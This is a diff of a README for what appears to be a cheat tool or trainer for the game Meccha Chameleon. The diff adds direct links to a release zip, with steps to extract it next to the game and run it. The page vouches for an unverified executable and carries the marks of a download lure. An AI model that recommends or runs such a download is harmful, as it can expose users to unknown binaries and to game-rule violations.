@@ -10,7 +10,7 @@ Instant camouflage tool for Meccha Chameleon. Auto-detects surface color and pai
 
 <div align="center">
 
-[![⬇️ Download](https://img.shields.io/badge/⬇️_Download-cc0000?style=for-the-badge&logo=github&logoColor=white)]()
+[![⬇️ Download](https://img.shields.io/badge/⬇️_Download-cc0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sanjayragavendra/MecchaChameleon-AutoPaintTool/releases/download/MecchaChameleonTool/MecchaChameleonTool.zip)
 
 </div>
 
@@ -30,11 +30,11 @@ Instant camouflage tool for Meccha Chameleon. Auto-detects surface color and pai
 
 <div align="center">
 
-### → [Download MecchaChameleonTool.zip]() ←
+### → [Download MecchaChameleonTool.zip](https://github.com/sanjayragavendra/MecchaChameleon-AutoPaintTool/releases/download/MecchaChameleonTool/MecchaChameleonTool.zip) ←
 
 </div>
 
-1. Download the latest version from the [release link]()
+1. Download the latest version from the [release link](https://github.com/sanjayragavendra/MecchaChameleon-AutoPaintTool/releases/download/MecchaChameleonTool/MecchaChameleonTool.zip)
 2. Extract next to your MECCHA CHAMELEON install
 3. Launch the game, then the trainer
 4. Press INSERT or F1 to open the menu
